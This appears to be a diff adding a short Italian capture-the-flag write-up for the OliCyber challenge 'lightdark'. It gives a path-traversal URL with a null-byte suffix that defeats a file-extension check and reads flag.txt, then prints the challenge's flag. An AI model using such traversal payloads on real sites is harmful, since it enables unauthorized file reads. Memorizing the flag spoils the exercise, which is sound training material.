@@ -1,0 +1,3 @@
+inserire un null-byte per annullare l'estensione del file (bug php4) e navigare nella directory precisa (http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css)
+
+Flag = flag{l1ght_1s_f0r_n00bs_d4rk_1s_f0r_h4ck3rs}
